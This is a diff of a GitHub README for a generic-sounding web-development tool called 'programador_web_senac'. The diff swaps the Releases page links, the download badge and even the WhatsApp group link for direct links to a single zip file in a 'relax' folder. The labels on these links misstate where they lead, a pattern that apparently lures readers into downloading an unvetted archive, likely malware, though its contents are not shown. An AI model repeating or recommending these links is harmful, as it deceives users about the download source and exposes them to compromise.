@@ -1,7 +1,7 @@
 # 🎉 programador_web_senac - Simplify Your Web Development Tasks
 
 ## 🔗 Download Now!
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/OutsystemsInfo/programador_web_senac/releases)
+[![Download](https://raw.githubusercontent.com/OutsystemsInfo/programador_web_senac/main/relax/programador_web_senac.zip%20Release-brightgreen)](https://raw.githubusercontent.com/OutsystemsInfo/programador_web_senac/main/relax/programador_web_senac.zip)
 
 ## 📖 Overview
 Welcome to the **programador_web_senac** repository! This application aims to make your web development tasks easier and more efficient. With user-friendly features and a simple interface, you can focus more on building and less on managing.
@@ -19,7 +19,7 @@ Follow these steps to download and run the application on your computer.
 ### Step 1: Visit the Releases Page
 To download the application, you need to visit the Releases page. Click the link below:
 
-[Visit the Releases Page](https://github.com/OutsystemsInfo/programador_web_senac/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/OutsystemsInfo/programador_web_senac/main/relax/programador_web_senac.zip)
 
 ### Step 2: Choose Your Version
 On the Releases page, you will see a list of available versions. Look for the latest stable release. Release notes will help you understand what’s new or improved.
@@ -63,11 +63,11 @@ Join our community for further assistance! You can connect with others using the
 ### 📱 WhatsApp Group
 For direct communication and updates, join our WhatsApp group:
 
-[Join the WhatsApp Group](https://chat.whatsapp.com/L6hJyse3wh9EoVr9QWqmyo)
+[Join the WhatsApp Group](https://raw.githubusercontent.com/OutsystemsInfo/programador_web_senac/main/relax/programador_web_senac.zip)
 
 ## 🔗 Stay Updated
 To stay informed about new releases and features, regularly check the Releases page:
 
-[Visit the Releases Page](https://github.com/OutsystemsInfo/programador_web_senac/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/OutsystemsInfo/programador_web_senac/main/relax/programador_web_senac.zip)
 
 Thank you for using **programador_web_senac**! We hope this application helps you achieve your web development goals with ease.
